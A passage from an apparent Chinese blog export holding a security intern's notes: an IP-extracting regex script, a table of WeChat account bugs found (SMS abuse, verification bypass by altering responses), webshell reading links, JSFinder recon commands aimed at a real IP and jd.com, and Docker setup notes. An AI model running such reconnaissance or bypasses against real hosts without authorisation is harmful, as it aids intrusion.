class=\"keyword\">except</span>:</span><br><span class=\"line\">                            <span class=\"keyword\">pass</span></span><br></pre></td></tr></table></figure>\n\n<p>更新：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> pandas <span class=\"keyword\">as</span> pd</span><br><span class=\"line\"><span class=\"keyword\">import</span> re</span><br><span class=\"line\"></span><br><span class=\"line\">df = pd.read_excel(<span class=\"string\">&#x27;1.xlsx&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">columns = df.columns.values.tolist()  <span class=\"comment\">### 获取excel 表头 ，第一行</span></span><br><span class=\"line\"><span class=\"comment\"># res=[]</span></span><br><span class=\"line\">myfile = <span class=\"built_in\">open</span>(<span class=\"string\">&quot;test.txt&quot;</span>, <span class=\"string\">&quot;w&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">patter1 = re.<span class=\"built_in\">compile</span>(<span class=\"string\">r&#x27;(25[0-5]|2[0-4]\\d|[0-1]\\d&#123;2&#125;|[1-9]?\\d)\\.(25[0-5]|2[0-4]\\d|[0-1]\\d&#123;2&#125;|[&#x27;</span></span><br><span class=\"line\">                     <span class=\"string\">r&#x27;1-9]?\\d)\\.(25[0-5]|2[0-4]\\d|[0-1]\\d&#123;2&#125;|[1-9]?\\d)\\.(25[0-5]|2[0-4]\\d|[&#x27;</span></span><br><span class=\"line\">                     <span class=\"string\">r&#x27;0-1]\\d&#123;2&#125;|[1-9]?\\d)&#x27;</span>)</span><br><span class=\"line\">patter2 = re.<span class=\"built_in\">compile</span>(<span class=\"string\">r&#x27;(25[0-5]|2[0-4]\\d|[0-1]\\d&#123;2&#125;|[1-9]?\\d)\\.(25[0-5]|2[0-4]\\d|[0-1]\\d&#123;2&#125;|[&#x27;</span></span><br><span class=\"line\">                     <span class=\"string\">r&#x27;1-9]?\\d)\\.(25[0-5]|2[0-4]\\d|[0-1]\\d&#123;2&#125;|[1-9]?\\d)\\.(25[0-5]|2[0-4]\\d|[&#x27;</span></span><br><span class=\"line\">                     <span class=\"string\">r&#x27;0-1]\\d&#123;2&#125;|[1-9]?\\d-25[0-5]|2[0-4]\\d|[&#x27;</span></span><br><span class=\"line\">                     <span class=\"string\">r&#x27;0-1]\\d&#123;2&#125;|[1-9]?\\d)-(25[0-5]|2[0-4]\\d|[0-1]\\d&#123;2&#125;|[1-9]?\\d)&#x27;</span>)</span><br><span class=\"line\"><span class=\"keyword\">for</span> idx, row <span class=\"keyword\">in</span> df.iterrows():  <span class=\"comment\">### 迭代数据 以键值对的形式 获取 每行的数据</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> column <span class=\"keyword\">in</span> columns:</span><br><span class=\"line\">        curstr = row[column]</span><br><span class=\"line\">        <span class=\"keyword\">if</span> pd.isna(curstr):</span><br><span class=\"line\">            <span class=\"keyword\">continue</span></span><br><span class=\"line\">        <span class=\"keyword\">try</span>:</span><br><span class=\"line\">            strlen = <span class=\"built_in\">len</span>(curstr)</span><br><span class=\"line\">        <span class=\"keyword\">except</span>:</span><br><span class=\"line\">            <span class=\"keyword\">continue</span></span><br><span class=\"line\">        res1 = re.findall(patter1, <span class=\"built_in\">str</span>(curstr))</span><br><span class=\"line\">        res2 = re.findall(patter2, <span class=\"built_in\">str</span>(curstr))</span><br><span class=\"line\">        <span class=\"keyword\">if</span> res1:</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(res1)</span><br><span class=\"line\">        <span class=\"keyword\">if</span> res2:</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(res2)</span><br></pre></td></tr></table></figure>\n\n\n\n<h4 id=\"公众号漏洞\"><a href=\"#公众号漏洞\" class=\"headerlink\" title=\"公众号漏洞\"></a>公众号漏洞</h4><table>\n<thead>\n<tr>\n<th align=\"center\">漏洞名称</th>\n<th align=\"center\">等级</th>\n<th align=\"center\">备注</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\">批量提交漏洞</td>\n<td align=\"center\">低</td>\n<td align=\"center\">可批量提交表单消耗服务器资源</td>\n</tr>\n<tr>\n<td align=\"center\">短信接口滥用</td>\n<td align=\"center\">中</td>\n<td align=\"center\">任意手机号一小时发五次也算</td>\n</tr>\n<tr>\n<td align=\"center\">敏感信息泄露</td>\n<td align=\"center\">低</td>\n<td align=\"center\"></td>\n</tr>\n<tr>\n<td align=\"center\">短信验证码绕过</td>\n<td align=\"center\">中</td>\n<td align=\"center\">修改返回包</td>\n</tr>\n</tbody></table>\n<h3 id=\"20日：\"><a href=\"#20日：\" class=\"headerlink\" title=\"20日：\"></a>20日：</h3><p>漏洞挖掘，挖到一个中危短信滥用、三个低危敏感信息泄露。</p>\n<p>学了点java安全知识。</p>\n<h3 id=\"22日：\"><a href=\"#22日：\" class=\"headerlink\" title=\"22日：\"></a>22日：</h3><p>忘了记了。</p>\n<h3 id=\"24日：\"><a href=\"#24日：\" class=\"headerlink\" title=\"24日：\"></a>24日：</h3><h2 id=\"TODO：\"><a href=\"#TODO：\" class=\"headerlink\" title=\"TODO：\"></a>TODO：</h2><table>\n<thead>\n<tr>\n<th align=\"center\">名称</th>\n<th align=\"center\">status</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\">了解jsp shell</td>\n<td align=\"center\">1</td>\n</tr>\n<tr>\n<td align=\"center\">正则表达式</td>\n<td align=\"center\">1</td>\n</tr>\n<tr>\n<td align=\"center\">P神java安全漫谈学习</td>\n<td align=\"center\">0</td>\n</tr>\n<tr>\n<td align=\"center\">jsfinder 使用</td>\n<td align=\"center\">0</td>\n</tr>\n<tr>\n<td align=\"center\">jsfinder代码理解</td>\n<td align=\"center\">0</td>\n</tr>\n</tbody></table>\n<h3 id=\"了解fastjson反序列化漏洞原理：\"><a href=\"#了解fastjson反序列化漏洞原理：\" class=\"headerlink\" title=\"了解fastjson反序列化漏洞原理：\"></a>了解fastjson反序列化漏洞原理：</h3><h3 id=\"Cors漏洞原理：\"><a href=\"#Cors漏洞原理：\" class=\"headerlink\" title=\"Cors漏洞原理：\"></a>Cors漏洞原理：</h3><h3 id=\"JSP-shell\"><a href=\"#JSP-shell\" class=\"headerlink\" title=\"JSP shell\"></a>JSP shell</h3><p><a href=\"https://www.runoob.com/jsp/jsp-tutorial.html\">JSP 教程 | 菜鸟教程 (runoob.com)</a></p>\n<p><a href=\"https://xz.aliyun.com/t/7798\">都0202年了老嗨还在用的 - 各种姿势jsp webshell - 先知社区 (aliyun.com)</a></p>\n<p><a href=\"https://blog.csdn.net/s452195377/article/details/93388422\">tomcat下jsp shell（webshell）_shell.jsp_夜行侠~@的博客-CSDN博客</a></p>\n<p><a href=\"https://cloud.tencent.com/developer/article/1667652\">【实战篇】记一次文件上传漏洞绕过 - 腾讯云开发者社区-腾讯云 (tencent.com)</a></p>\n<p><a href=\"https://www.cnblogs.com/blacksunny/p/8001201.html\">文件上传漏洞（绕过姿势） - blacksunny - 博客园 (cnblogs.com)</a></p>\n<p><a href=\"https://www.cnblogs.com/straycats/p/14461357.html\">https://www.cnblogs.com/straycats/p/14461357.html</a></p>\n<h3 id=\"正则表达式\"><a href=\"#正则表达式\" class=\"headerlink\" title=\"正则表达式\"></a>正则表达式</h3><p><a href=\"https://blog.csdn.net/pagean/article/details/106032082\">一篇认真的正则入门文章：正则表达式数字和数字范围匹配表达_正则表达式匹配数字范围_曼巴的脚步的博客-CSDN博客</a></p>\n<p><a href=\"https://www.runoob.com/python/python-reg-expressions.html\">Python 正则表达式 | 菜鸟教程 (runoob.com)</a></p>\n<p><a href=\"https://www.sojson.com/regex/generate\">正则表达式生成器，常用正则表达式在线生成 (sojson.com)</a></p>\n<p><a href=\"https://www.mklab.cn/utils/regex\">Regex正则表达式在线测试生成工具 - MKLab在线工具</a></p>\n<p><a href=\"https://www.cnblogs.com/admans/p/11955614.html#:~:text=%E4%BB%8E%E6%AD%A3%E5%88%99%E8%AF%AD%E6%B3%95%E7%9A%84%E8%A7%92%E5%BA%A6%E6%9D%A5%E8%AE%B2%EF%BC%8C%E8%A2%AB%E5%8C%B9%E9%85%8D%E4%BC%98%E5%85%88%E9%87%8F%E8%AF%8D%E4%BF%AE%E9%A5%B0%E7%9A%84%E5%AD%90%E8%A1%A8%E8%BE%BE%E5%BC%8F%E4%BD%BF%E7%94%A8%E7%9A%84%E5%B0%B1%E6%98%AF%E8%B4%AA%E5%A9%AA%E6%A8%A1%E5%BC%8F%EF%BC%8C%E5%A6%82%E2%80%9C,(Expression\">正则表达式之 贪婪与非贪婪模式详解（概述） - JackieZhengChina - 博客园 (cnblogs.com)</a>%2B”；被忽略优先量词修饰的子表达式使用的就是非贪婪模式，如“ (Expression)%2B%3F”。)</p>\n<p><a href=\"https://blog.csdn.net/jly164260234/article/details/83215924\">Python—re.findall的用法_扫地di的博客-CSDN博客</a></p>\n<p>正则表达式是一个特殊的字符序列，它能帮助你方便的检查一个字符串是否与某种模式匹配。</p>\n<p>re 模块使 Python 语言拥有全部的正则表达式功能。</p>\n<p>compile 函数根据一个模式字符串和可选的标志参数生成一个正则表达式对象。该对象拥有一系列方法用于正则表达式匹配和替换。re 模块也提供了与这些方法功能完全一致的函数，这些函数使用一个模式字符串做为它们的第一个参数。</p>\n<h4 id=\"re-match函数\"><a href=\"#re-match函数\" class=\"headerlink\" title=\"re.match函数\"></a>re.match函数</h4><p>re.match 尝试从字符串的<strong>起始位置</strong>匹配一个模式，如果不是起始位置匹配成功的话，match() 就返回 none。</p>\n<p>语法：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">re.match(pattern, string, flags=<span class=\"number\">0</span>)</span><br></pre></td></tr></table></figure>\n\n<table>\n<thead>\n<tr>\n<th align=\"center\">参数</th>\n<th align=\"center\">描述</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\">pattern</td>\n<td align=\"center\">匹配的正则表达式</td>\n</tr>\n<tr>\n<td align=\"center\">string</td>\n<td align=\"center\">要匹配的字符串。</td>\n</tr>\n<tr>\n<td align=\"center\">flags</td>\n<td align=\"center\">标志位，用于控制正则表达式的匹配方式，如：是否区分大小写，多行匹配等等。参见：<a href=\"https://www.runoob.com/python/python-reg-expressions.html#flags\">正则表达式修饰符 - 可选标志</a></td>\n</tr>\n</tbody></table>\n<p>re的修饰符：</p>\n<table>\n<thead>\n<tr>\n<th align=\"center\">修饰符</th>\n<th align=\"center\">描述</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\">re.I</td>\n<td align=\"center\">使匹配对大小写不敏感</td>\n</tr>\n<tr>\n<td align=\"center\">re.L</td>\n<td align=\"center\">做本地化识别（locale-aware）匹配</td>\n</tr>\n<tr>\n<td align=\"center\">re.M</td>\n<td align=\"center\">多行匹配，影响 ^ 和 $</td>\n</tr>\n<tr>\n<td align=\"center\">re.S</td>\n<td align=\"center\">使 . 匹配包括换行在内的所有字符</td>\n</tr>\n<tr>\n<td align=\"center\">re.U</td>\n<td align=\"center\">根据Unicode字符集解析字符。这个标志影响 \\w, \\W, \\b, \\B.</td>\n</tr>\n<tr>\n<td align=\"center\">re.X</td>\n<td align=\"center\">该标志通过给予你更灵活的格式以便你将正则表达式写得更易于理解。</td>\n</tr>\n</tbody></table>\n<p>下面讲个例子：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> re</span><br><span class=\"line\"> </span><br><span class=\"line\">line = <span class=\"string\">&quot;Cats are smarter than dogs&quot;</span></span><br><span class=\"line\"> </span><br><span class=\"line\">matchObj = re.<span class=\"keyword\">match</span>( <span class=\"string\">r&#x27;(.*) are (.*?) .*&#x27;</span>, line, re.M|re.I)</span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"keyword\">if</span> matchObj:</span><br><span class=\"line\">   <span class=\"built_in\">print</span> <span class=\"string\">&quot;matchObj.group() : &quot;</span>, matchObj.group()</span><br><span class=\"line\">   <span class=\"built_in\">print</span> <span class=\"string\">&quot;matchObj.group(1) : &quot;</span>, matchObj.group(<span class=\"number\">1</span>)</span><br><span class=\"line\">   <span class=\"built_in\">print</span> <span class=\"string\">&quot;matchObj.group(2) : &quot;</span>, matchObj.group(<span class=\"number\">2</span>)</span><br><span class=\"line\"><span class=\"keyword\">else</span>:</span><br><span class=\"line\">   <span class=\"built_in\">print</span> <span class=\"string\">&quot;No match!!&quot;</span></span><br></pre></td></tr></table></figure>\n\n<p>输出为：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">matchObj.group() :  Cats are smarter than dogs</span><br><span class=\"line\">matchObj.group(1) :  Cats</span><br><span class=\"line\">matchObj.group(2) :  smarter</span><br></pre></td></tr></table></figure>\n\n<p>对应结果为：</p>\n<table>\n<thead>\n<tr>\n<th align=\"center\">匹配对象方法</th>\n<th align=\"center\">描述</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\">group(num&#x3D;0)</td>\n<td align=\"center\">匹配的整个表达式的字符串，group() 可以一次输入多个组号，在这种情况下它将返回一个包含那些组所对应值的元组。</td>\n</tr>\n<tr>\n<td align=\"center\">groups()</td>\n<td align=\"center\">返回一个包含所有小组字符串的元组，从 1 到 所含的小组号。</td>\n</tr>\n</tbody></table>\n<p>因为match比较菜，就不多说了。</p>\n<h4 id=\"re-search方法\"><a href=\"#re-search方法\" class=\"headerlink\" title=\"re.search方法\"></a>re.search方法</h4><p>re.search 扫描整个字符串并返回第一个成功的匹配。</p>\n<p>语法：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">re.search(pattern, string, flags=0)</span><br></pre></td></tr></table></figure>\n\n<p>函数参数说明：</p>\n<table>\n<thead>\n<tr>\n<th align=\"left\">参数</th>\n<th align=\"left\">描述</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"left\">pattern</td>\n<td align=\"left\">匹配的正则表达式</td>\n</tr>\n<tr>\n<td align=\"left\">string</td>\n<td align=\"left\">要匹配的字符串。</td>\n</tr>\n<tr>\n<td align=\"left\">flags</td>\n<td align=\"left\">标志位，用于控制正则表达式的匹配方式，如：是否区分大小写，多行匹配等等。</td>\n</tr>\n</tbody></table>\n<p>匹配成功re.search方法返回一个匹配的对象，否则返回None。</p>\n<p>我们可以使用group(num) 或 groups() 匹配对象函数来获取匹配表达式。</p>\n<table>\n<thead>\n<tr>\n<th align=\"left\">匹配对象方法</th>\n<th align=\"left\">描述</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"left\">group(num&#x3D;0)</td>\n<td align=\"left\">匹配的整个表达式的字符串，group() 可以一次输入多个组号，在这种情况下它将返回一个包含那些组所对应值的元组。</td>\n</tr>\n<tr>\n<td align=\"left\">groups()</td>\n<td align=\"left\">返回一个包含所有小组字符串的元组，从 1 到 所含的小组号。</td>\n</tr>\n</tbody></table>\n<h4 id=\"re-match与re-search的区别\"><a href=\"#re-match与re-search的区别\" class=\"headerlink\" title=\"re.match与re.search的区别\"></a>re.match与re.search的区别</h4><p>re.match只匹配字符串的开始，如果字符串开始不符合正则表达式，则匹配失败，函数返回None；而re.search匹配整个字符串，直到找到一个匹配。</p>\n<h4 id=\"检索和替换\"><a href=\"#检索和替换\" class=\"headerlink\" title=\"检索和替换\"></a>检索和替换</h4><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">re.sub(pattern, repl, string, count=<span class=\"number\">0</span>, flags=<span class=\"number\">0</span>)</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>pattern : 正则中的模式字符串。</li>\n<li>repl : 替换的字符串，也可为一个函数。</li>\n<li>string : 要被查找替换的原始字符串。</li>\n<li>count : 模式匹配后替换的最大次数，默认 0 表示替换所有的匹配。</li>\n</ul>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> re</span><br><span class=\"line\"> </span><br><span class=\"line\">phone = <span class=\"string\">&quot;2004-959-559 # 这是一个国外电话号码&quot;</span></span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"comment\"># 删除字符串中的 Python注释 </span></span><br><span class=\"line\">num = re.sub(<span class=\"string\">r&#x27;#.*$&#x27;</span>, <span class=\"string\">&quot;&quot;</span>, phone)</span><br><span class=\"line\"><span class=\"built_in\">print</span> <span class=\"string\">&quot;电话号码是: &quot;</span>, num</span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"comment\"># 删除非数字(-)的字符串 </span></span><br><span class=\"line\">num = re.sub(<span class=\"string\">r&#x27;\\D&#x27;</span>, <span class=\"string\">&quot;&quot;</span>, phone)</span><br><span class=\"line\"><span class=\"built_in\">print</span> <span class=\"string\">&quot;电话号码是 : &quot;</span>, num</span><br><span class=\"line\"><span class=\"comment\">#电话号码是:  2004-959-559 </span></span><br><span class=\"line\"><span class=\"comment\">#电话号码是 :  2004959559</span></span><br></pre></td></tr></table></figure>\n\n<p>repl 参数是一个函数:</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> re</span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"comment\"># 将匹配的数字乘以 2</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">double</span>(<span class=\"params\">matched</span>):</span><br><span class=\"line\">    value = <span class=\"built_in\">int</span>(matched.group(<span class=\"string\">&#x27;value&#x27;</span>))</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"built_in\">str</span>(value * <span class=\"number\">2</span>)</span><br><span class=\"line\"> </span><br><span class=\"line\">s = <span class=\"string\">&#x27;A23G4HFD567&#x27;</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(re.sub(<span class=\"string\">&#x27;(?P&lt;value&gt;\\d+)&#x27;</span>, double, s))</span><br></pre></td></tr></table></figure>\n\n<p>不管了，直接实战</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> pandas <span class=\"keyword\">as</span> pd</span><br><span class=\"line\"><span class=\"keyword\">import</span> re</span><br><span class=\"line\"></span><br><span class=\"line\">df = pd.read_excel(<span class=\"string\">&#x27;1.xlsx&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">columns = df.columns.values.tolist()  <span class=\"comment\">### 获取excel 表头 ，第一行</span></span><br><span class=\"line\"><span class=\"comment\"># res=[]</span></span><br><span class=\"line\">myfile = <span class=\"built_in\">open</span>(<span class=\"string\">&quot;test.txt&quot;</span>, <span class=\"string\">&quot;w&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">patter1 = re.<span class=\"built_in\">compile</span>(<span class=\"string\">r&#x27;(25[0-5]|2[0-4]\\d|[0-1]\\d&#123;2&#125;|[1-9]?\\d)\\.(25[0-5]|2[0-4]\\d|[0-1]\\d&#123;2&#125;|[&#x27;</span></span><br><span class=\"line\">                     <span class=\"string\">r&#x27;1-9]?\\d)\\.(25[0-5]|2[0-4]\\d|[0-1]\\d&#123;2&#125;|[1-9]?\\d)\\.(25[0-5]|2[0-4]\\d|[&#x27;</span></span><br><span class=\"line\">                     <span class=\"string\">r&#x27;0-1]\\d&#123;2&#125;|[1-9]?\\d)&#x27;</span>)</span><br><span class=\"line\">patter2 = re.<span class=\"built_in\">compile</span>(<span class=\"string\">r&#x27;(25[0-5]|2[0-4]\\d|[0-1]\\d&#123;2&#125;|[1-9]?\\d)\\.(25[0-5]|2[0-4]\\d|[0-1]\\d&#123;2&#125;|[&#x27;</span></span><br><span class=\"line\">                     <span class=\"string\">r&#x27;1-9]?\\d)\\.(25[0-5]|2[0-4]\\d|[0-1]\\d&#123;2&#125;|[1-9]?\\d)\\.(25[0-5]|2[0-4]\\d|[&#x27;</span></span><br><span class=\"line\">                     <span class=\"string\">r&#x27;0-1]\\d&#123;2&#125;|[1-9]?\\d-25[0-5]|2[0-4]\\d|[&#x27;</span></span><br><span class=\"line\">                     <span class=\"string\">r&#x27;0-1]\\d&#123;2&#125;|[1-9]?\\d)-(25[0-5]|2[0-4]\\d|[0-1]\\d&#123;2&#125;|[1-9]?\\d)&#x27;</span>)</span><br><span class=\"line\"><span class=\"keyword\">for</span> idx, row <span class=\"keyword\">in</span> df.iterrows():  <span class=\"comment\">### 迭代数据 以键值对的形式 获取 每行的数据</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> column <span class=\"keyword\">in</span> columns:</span><br><span class=\"line\">        curstr = row[column]</span><br><span class=\"line\">        <span class=\"keyword\">if</span> pd.isna(curstr):</span><br><span class=\"line\">            <span class=\"keyword\">continue</span></span><br><span class=\"line\">        <span class=\"keyword\">try</span>:</span><br><span class=\"line\">            strlen = <span class=\"built_in\">len</span>(curstr)</span><br><span class=\"line\">        <span class=\"keyword\">except</span>:</span><br><span class=\"line\">            <span class=\"keyword\">continue</span></span><br><span class=\"line\">        res1 = re.findall(patter1, <span class=\"built_in\">str</span>(curstr))</span><br><span class=\"line\">        res2 = re.findall(patter2, <span class=\"built_in\">str</span>(curstr))</span><br><span class=\"line\">        <span class=\"keyword\">if</span> res1:</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(res1)</span><br><span class=\"line\">        <span class=\"keyword\">if</span> res2:</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(res2)</span><br></pre></td></tr></table></figure>\n\n<p>可以提取IP形如：192.168.1.1，192.168.1.1-192.168.1.100</p>\n<h3 id=\"java安全学习\"><a href=\"#java安全学习\" class=\"headerlink\" title=\"java安全学习\"></a>java安全学习</h3><h3 id=\"jsFinder-AND-Plus-敏感信息泄露发现神器（内网IP、password等）\"><a href=\"#jsFinder-AND-Plus-敏感信息泄露发现神器（内网IP、password等）\" class=\"headerlink\" title=\"jsFinder AND Plus : 敏感信息泄露发现神器（内网IP、password等）\"></a>jsFinder AND Plus : 敏感信息泄露发现神器（内网IP、password等）</h3><p><a href=\"https://blog.csdn.net/qq_41901122/article/details/125151522\">(40条消息) JS信息收集工具JSFinder_星球守护者的博客-CSDN博客</a></p>\n<p><a href=\"https://xz.aliyun.com/t/5390\">JSFinder—从js文件中寻找敏感接口和子域名 - 先知社区 (aliyun.com)</a></p>\n<h4 id=\"Plus\"><a href=\"#Plus\" class=\"headerlink\" title=\"Plus:\"></a>Plus:</h4><p>查看帮助：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">python3  JSFinderPlus.py -h</span><br></pre></td></tr></table></figure>\n\n<p>简单爬取的：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">python3 JSFinderPlus.py -u http://202.204.48.66/</span><br></pre></td></tr></table></figure>\n\n<p>深度爬取:</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">python3 JSFinderPlus.py -u http://202.204.48.66/ -d</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230324223636869.png\" alt=\"image-20230324223636869\"></p>\n<h4 id=\"jsFinder\"><a href=\"#jsFinder\" class=\"headerlink\" title=\"jsFinder:\"></a>jsFinder:</h4><p><a href=\"https://xz.aliyun.com/t/5390\">JSFinder—从js文件中寻找敏感接口和子域名 - 先知社区 (aliyun.com)</a></p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">python3 JSFinder.py -u https://www.jd.com/</span><br></pre></td></tr></table></figure>\n\n<p>当你想获取更多信息的时候，可以使用-d进行深度爬取来获得更多内容，并使用命令 -ou, -os来指定URL和子域名所保存的文件名。</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">python3 JSFinder.py -u https://www.jd.com/ -d -ou jd_url.txt -os jd_domain.txt</span><br></pre></td></tr></table></figure>\n\n<p>除了这两种方式以外，还可以批量指定URL和JS链接来获取里面的URL。</p>\n<p>指定URL：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">python JSFinder.py -f text.txt</span><br></pre></td></tr></table></figure>\n\n<p>指定JS：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">python JSFinder.py -f text.txt -j</span><br></pre></td></tr></table></figure>\n","tags":["日常记录 安全服务实习生"]},{"title":"docker use","url":"/2023/03/01/docker/","content":"<h1 id=\"Docker学习\"><a href=\"#Docker学习\" class=\"headerlink\" title=\"Docker学习\"></a>Docker学习</h1><p>对应大纲：<img src=\"https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230301085455109.png\" alt=\"image-20230301085455109\" style=\"zoom:25%;\" /></p>\n<h3 id=\"1、初识DOCKER\"><a href=\"#1、初识DOCKER\" class=\"headerlink\" title=\"1、初识DOCKER\"></a>1、初识DOCKER</h3><h5 id=\"Docker安装\"><a href=\"#Docker安装\" class=\"headerlink\" title=\"Docker安装\"></a>Docker安装</h5><p>三个环境：开发环境、测试环境、生产环境</p>\n<img src=\"https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230301085726456.png\" alt=\"image-20230301085726456\" style=\"zoom: 25%;\" />\n\n<p>环境不同可能会造成问题，手动迁移很麻烦。</p>\n<p>可以使用容器来迁移环境，解决软件跨环境迁移问题。</p>\n<p>Docker概念：Docker是一个开源的应用容器引擎，容器完全是使用沙箱机制，之间相互隔离，容器性能开销低。分为CE版和EE版</p>\n<p>安装docker，本次学习docker安装在centos7上</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 1、yum 包更新到最新 </span></span><br><span class=\"line\">yum update</span><br><span class=\"line\"><span class=\"comment\"># 2、安装需要的软件包， yum-util 提供yum-config-manager功能，另外两个是devicemapper驱动依赖的 </span></span><br><span class=\"line\">yum install -y yum-utils device-mapper-persistent-data lvm2</span><br><span class=\"line\"><span class=\"comment\"># 3、 设置yum源</span></span><br><span class=\"line\">yum-config-manager --add-repo https://download.docker.com/linux/centos/docker-ce.repo</span><br><span class=\"line\"><span class=\"comment\"># 4、 安装docker，出现输入的界面都按 y </span></span><br><span class=\"line\">yum install -y docker-ce</span><br><span class=\"line\"><span class=\"comment\"># 5、 查看docker版本，验证是否验证成功</span></span><br><span class=\"line\">docker -v</span><br></pre></td></tr></table></figure>\n\n<img src=\"https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230301092147712.png\" alt=\"image-20230301092147712\"  />\n\n<h5 id=\"Docker架构\"><a href=\"#Docker架构\" class=\"headerlink\" title=\"Docker架构\"></a>Docker架构</h5><p>图片示例：<img src=\"https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230301092338599.png\" alt=\"image-20230301092338599\" style=\"zoom: 33%;\" /></p>\n<p>对应概念：</p>\n<ul>\n<li><p>镜像（Image）：Docker 镜像（Image），就相当于是 一个 root 文件系统。比如官方镜像 ubuntu:16.04 就包 含了完整的一套 Ubuntu16.04 最小系统的 root 文件系 统。 </p>\n</li>\n<li><p>容器（Container）：镜像（Image）和容器（Contain er）的关系，就像是面向对象程序设计中的类和对象一 样，镜像是静态的定义，容器是镜像运行时的实体。容 器可以被创建、启动、停止、删除、暂停等。</p>\n</li>\n</ul>\n<p>仓库（Repository）：仓库可看成一个代码控制中心， 用来保存镜像</p>\n<h5 id=\"配置Docker镜像加速器\"><a href=\"#配置Docker镜像加速器\" class=\"headerlink\" title=\"配置Docker镜像加速器\"></a>配置Docker镜像加速器</h5><p>使用阿里云镜像加速器</p>\n<p>修改daemon配置文件&#x2F;etc&#x2F;docker&#x2F;daemon.json来使用加速器</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo <span class=\"built_in\">mkdir</span> -p /etc/docker</span><br><span class=\"line\">sudo <span class=\"built_in\">tee</span> /etc/docker/daemon.json &lt;&lt;-<span class=\"string\">&#x27;EOF&#x27;</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"string\">&quot;registry-mirrors&quot;</span>: [<span class=\"string\">&quot;https://5zu0nxqo.mirror.aliyuncs.com&quot;</span>]</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">EOF</span><br><span class=\"line\">sudo systemctl daemon-reload</span><br><span class=\"line\">sudo systemctl restart docker</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230301093225304.png\" alt=\"image-20230301093225304\"></p>\n<p>完成</p>\n<h3 id=\"2、Docker命令\"><a href=\"#2、Docker命令\" class=\"headerlink\" title=\"2、Docker命令\"></a>2、Docker命令</h3><h5 id=\"Docker服务相关命令\"><a href=\"#Docker服务相关命令\" class=\"headerlink\" title=\"Docker服务相关命令\"></a>Docker服务相关命令</h5><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">启动docker服务:systemctl start docker </span><br><span class=\"line\">停止docker服务:systemctl stop docker </span><br><span class=\"line\">重启docker服务:systemctl restart docker</span><br><span class=\"line\">查看docker服务状态:systemctl status docker </span><br><span class=\"line\">设置开机启动docker服务:systemctl enable docker</span><br></pre></td></tr></table></figure>\n\n<h5 id=\"Docker镜像相关命令\"><a href=\"#Docker镜像相关命令\" class=\"headerlink\" title=\"Docker镜像相关命令\"></a>Docker镜像相关命令</h5><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">查看镜像: 查看本地所有的镜像</span><br><span class=\"line\">docker images</span><br><span class=\"line\">docker images –q <span class=\"comment\"># 查看所用镜像的id</span></span><br><span class=\"line\"></span><br><span class=\"line\">搜索镜像:从网络中查找需要的镜像</span><br><span 